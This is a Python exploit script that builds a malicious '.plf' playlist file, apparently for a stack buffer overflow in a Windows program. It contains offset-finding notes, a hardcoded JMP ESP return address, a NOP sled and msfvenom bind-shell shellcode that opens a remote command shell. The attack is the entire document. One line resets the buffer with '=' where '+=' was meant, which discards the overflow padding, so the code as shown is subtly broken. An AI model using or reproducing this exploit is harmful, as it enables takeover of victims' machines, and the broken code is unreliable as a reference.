#!/usr/bin/python

file = open("exploit.plf", "wb")

# EIP
# ./pattern_offset.rb -q 37694136
# [*] Exact match at offset 260

# Top of the stack
# ./pattern_offset.rb -q 6a41336a
# [*] Exact match at offset 280

buffer = "A" * 260

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note the address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e"

buffer = "\x90" * 60

# msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0a\x1a"
buffer += ("\xd9\xcf\xd9\x74\x24\xf4\x5a\xbe\x73\x97\xeb\x8e\x2b\xc9\xb1"
"\x53\x31\x72\x17\x03\x72\x17\x83\x99\x6b\x09\x7b\xa1\x7c\x4c"
"\x84\x59\x7d\x31\x0c\xbc\x4c\x71\x6a\xb5\xff\x41\xf8\x9b\xf3"
"\x2a\xac\x0f\x87\x5f\x79\x20\x20\xd5\x5f\x0f\xb1\x46\xa3\x0e"
"\x31\x95\xf0\xf0\x08\x56\x05\xf1\x4d\x8b\xe4\xa3\x06\xc7\x5b"
"\x53\x22\x9d\x67\xd8\x78\x33\xe0\x3d\xc8\x32\xc1\x90\x42\x6d"
"\xc1\x13\x86\x05\x48\x0b\xcb\x20\x02\xa0\x3f\xde\x95\x60\x0e"
"\x1f\x39\x4d\xbe\xd2\x43\x8a\x79\x0d\x36\xe2\x79\xb0\x41\x31"
"\x03\x6e\xc7\xa1\xa3\xe5\x7f\x0d\x55\x29\x19\xc6\x59\x86\x6d"
"\x80\x7d\x19\xa1\xbb\x7a\x92\x44\x6b\x0b\xe0\x62\xaf\x57\xb2"
"\x0b\xf6\x3d\x15\x33\xe8\x9d\xca\x91\x63\x33\x1e\xa8\x2e\x5c"
"\xd3\x81\xd0\x9c\x7b\x91\xa3\xae\x24\x09\x2b\x83\xad\x97\xac"
"\xe4\x87\x60\x22\x1b\x28\x91\x6b\xd8\x7c\xc1\x03\xc9\xfc\x8a"
"\xd3\xf6\x28\x26\xdb\x51\x83\x55\x26\x21\x73\xda\x88\xca\x99"
"\xd5\xf7\xeb\xa1\x3f\x90\x84\x5f\xc0\x8f\x08\xe9\x26\xc5\xa0"
"\xbf\xf1\x71\x03\xe4\xc9\xe6\x7c\xce\x61\x80\x35\x18\xb5\xaf"
"\xc5\x0e\x91\x27\x4e\x5d\x25\x56\x51\x48\x0d\x0f\xc6\x06\xdc"
"\x62\x76\x16\xf5\x14\x1b\x85\x92\xe4\x52\xb6\x0c\xb3\x33\x08"
"\x45\x51\xae\x33\xff\x47\x33\xa5\x38\xc3\xe8\x16\xc6\xca\x7d"
"\x22\xec\xdc\xbb\xab\xa8\x88\x13\xfa\x66\x66\xd2\x54\xc9\xd0"
"\x8c\x0b\x83\xb4\x49\x60\x14\xc2\x55\xad\xe2\x2a\xe7\x18\xb3"
"\x55\xc8\xcc\x33\x2e\x34\x6d\xbb\xe5\xfc\x9d\xf6\xa7\x55\x36"
"\x5f\x32\xe4\x5b\x60\xe9\x2b\x62\xe3\x1b\xd4\x91\xfb\x6e\xd1"
"\xde\xbb\x83\xab\x4f\x2e\xa3\x18\x6f\x7b")

file.write(buffer)

file.close()
